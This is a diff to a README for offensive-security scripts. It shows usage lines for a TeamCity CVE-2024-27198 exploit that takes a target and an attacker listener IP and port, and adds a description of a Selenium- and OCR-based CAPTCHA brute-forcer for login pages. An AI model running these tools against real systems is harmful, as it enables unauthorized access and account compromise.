@@ -23,3 +23,13 @@ This script automates the process of building, uploading, enabling, and triggeri
 
 ## Usage
 python3 teamcity_CVE-2024-27198.py -t http://target:8111 -l 10.10.14.5 -p 4444
+
+## Captcha Brute-Force
+
+This Python script automates login attempts on a web page protected by a CAPTCHA. It uses Selenium to control a browser, downloads the CAPTCHA image, reads it using OCR (pytesseract), and tries passwords from a given wordlist.
+
+## Usage
+
+python3 captcha_brute_force.py -t traget_url -w wordlist -u username -c captcha_page
+
+
